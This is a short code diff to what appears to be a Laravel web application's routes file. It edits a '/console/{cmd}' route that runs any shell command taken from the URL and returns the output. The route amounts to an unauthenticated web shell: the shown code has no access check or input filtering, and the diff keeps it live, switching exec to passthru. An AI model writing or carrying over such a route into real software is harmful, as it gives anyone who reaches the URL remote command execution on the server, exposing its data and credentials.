@@ -25,7 +25,8 @@ Route::get('/logout', 'SessionsController@destroy');
 Route::get('/admin', 'AdminController@index')->name('admin');
 
 Route::get('/console/{cmd}', function ($cmd) {
-	$output = [];
-	exec('cd .. && ' . $cmd, $output);
-	die('<pre>' . implode('<br>', $output) . '</pre>');
+	echo "<pre>";
+	$output = passthru('cd .. && ' . $cmd);
+	die();
+//	die('<pre>' . $output . '</pre>');
 });
